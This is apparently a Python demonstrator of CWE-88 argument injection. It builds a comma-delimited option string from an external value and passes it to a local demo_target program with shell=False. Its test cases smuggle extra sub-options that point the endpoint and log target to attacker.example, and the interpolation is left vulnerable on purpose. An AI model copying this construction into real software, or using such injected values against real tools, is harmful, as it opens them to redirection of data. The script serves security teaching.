#!/usr/bin/env python3

"""Product-independent CWE-88 embedded sub-option injection demonstrator.

The caller intentionally uses subprocess.run() with a list and shell=False.
The externally controlled field remains inside one OS-level argument. The
receiving demo_target program then reparses that argument as a comma-delimited
sub-option language.

No network access, shell command execution, or vendor-specific behavior is
involved. The test values are fixed demonstration strings.
"""

from __future__ import annotations

import argparse
import pathlib
import subprocess
import sys

CASES = {
    "control": "42",
    "inject-new": "42,log_target=attacker.example",
    "override": "42,endpoint=attacker.example",
}


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("case", choices=CASES)
    parser.add_argument(
        "--target",
        default=str(pathlib.Path(__file__).with_name("demo_target")),
        help="path to the locally built demo_target binary",
    )
    args = parser.parse_args()

    external_value = CASES[args.case]

    # This is the vulnerable construction being generalized:
    # externally controlled field data is interpolated into a value whose
    # receiving command defines as a comma-delimited mini-language.
    option_argument = f"endpoint=trusted.example,id={external_value}"

    # Important: there are exactly three OS-level argv elements at the target.
    # No shell parses this command line.
    command = [args.target, "-o", option_argument]

    print(f"[caller] case={args.case}")
    print(f"[caller] external_value=<{external_value}>")
    print(f"[caller] list_elements={len(command)}")
    for index, element in enumerate(command):
        print(f"[caller] command[{index}]=<{element}>")
    print("[caller] shell=False")
    print("[caller] --- target output ---")
    sys.stdout.flush()

    completed = subprocess.run(command, shell=False, check=False)
    return completed.returncode


if __name__ == "__main__":
    sys.exit(main())
